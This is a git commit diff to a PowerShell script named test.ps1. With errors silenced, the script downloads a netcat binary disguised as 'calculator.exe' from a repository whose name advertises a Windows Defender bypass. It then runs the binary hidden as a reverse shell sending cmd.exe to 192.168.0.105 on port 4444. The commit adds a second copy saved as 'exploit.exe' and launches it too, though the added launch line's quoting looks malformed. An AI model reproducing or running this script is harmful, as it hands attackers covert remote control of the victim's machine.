e42a9decbcb81ca033772c86a6efe3b4a7d0b3d1
Tech_kY <mr.annonymous2008@gmail.com>
2025-09-15 15:14:33 +0530

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,8 +1,8 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
 $TempDir = "C:\TempVBS"
-$NcPath = "$TempDir\nc.exe"
-
+$NcPath = "$TempDir\calculator.exe"
+$NcPath1 = "$TempDir\exploit.exe"
 try {
     New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
 } catch {}
@@ -13,11 +13,13 @@ try {
 
 try {
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/main/calculator.exe" -OutFile $NcPath
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/main/calculator.exe" -OutFile $NcPath1
 } catch {}
 
 try {
     $WshShell = New-Object -ComObject WScript.Shell
     $WshShell.Run("`"$NcPath`" 192.168.0.105 4444 -e cmd.exe", 0, $false)
+    $WshShell.Run("`"$NcPath1`"./exploit.exe", 0, $false)
 } catch {}
 
 Start-Sleep -Seconds 1
